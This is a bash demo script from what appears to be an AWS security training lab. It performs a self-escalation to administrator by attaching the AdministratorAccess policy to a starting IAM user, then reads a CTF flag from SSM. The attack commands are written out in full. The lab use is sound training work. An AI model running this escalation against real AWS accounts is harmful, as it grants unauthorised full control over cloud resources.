#!/bin/bash

# Demo script for iam:AttachUserPolicy privilege escalation
# This is a USER-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-008-to-admin-starting-user"
MANAGED_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachUserPolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}User-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(OTEL_TRACES_EXPORTER= terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_008_iam_attachuserpolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(OTEL_TRACES_EXPORTER= terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify identity as starting user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
use_starting_creds
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# [EXPLOIT] Step 3: Test current permissions (proving limited access)
echo -e "${YELLOW}Step 3: Testing current permissions${NC}"
echo "Attempting to list IAM users (should fail)..."
use_starting_creds
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
else
    echo -e "${YELLOW}Warning: Unexpected permissions${NC}\n"
fi

# [EXPLOIT] Step 4: Perform privilege escalation
echo -e "${YELLOW}Step 4: Escalating privileges via iam:AttachUserPolicy${NC}"
echo "Attaching AdministratorAccess managed policy to self..."
use_starting_creds
show_attack_cmd "Attacker" "aws iam attach-user-policy --user-name $STARTING_USER --policy-arn $MANAGED_POLICY_ARN"
aws iam attach-user-policy \
    --user-name $STARTING_USER \
    --policy-arn $MANAGED_POLICY_ARN

echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# [OBSERVATION] Step 5: Verify admin access
echo -e "${YELLOW}Step 5: Verifying administrator access${NC}"
echo "Checking attached policies on starting user..."
use_readonly_creds
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name $STARTING_USER \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
    exit 1
fi

echo "Testing admin permissions (listing IAM users)..."
show_cmd "ReadOnly" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"

echo "Testing S3 access..."
show_cmd "ReadOnly" "aws s3 ls"
aws s3 ls | head -5 || echo -e "${YELLOW}(No buckets or still propagating)${NC}"

echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# [EXPLOIT] Step 6: Capture the CTF flag
echo -e "${YELLOW}Step 6: Capturing the CTF flag${NC}"
use_starting_creds
show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-008-to-admin --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name /pathfinding-labs/flags/iam-008-to-admin --query 'Parameter.Value' --output text)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}Error: Could not retrieve CTF flag — ensure the scenario is deployed and admin access propagated${NC}"
    exit 1
fi

echo -e "${GREEN}✓ CTF flag captured!${NC}\n"

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Attack: Used ${YELLOW}iam:AttachUserPolicy${NC} to attach AdministratorAccess to self"
echo -e "Result: ${GREEN}Administrator Access${NC}"
echo -e "Flag: ${GREEN}$FLAG_VALUE${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AttachUserPolicy on self) → Admin → (ssm:GetParameter) → CTF Flag"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the managed policy${NC}"
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
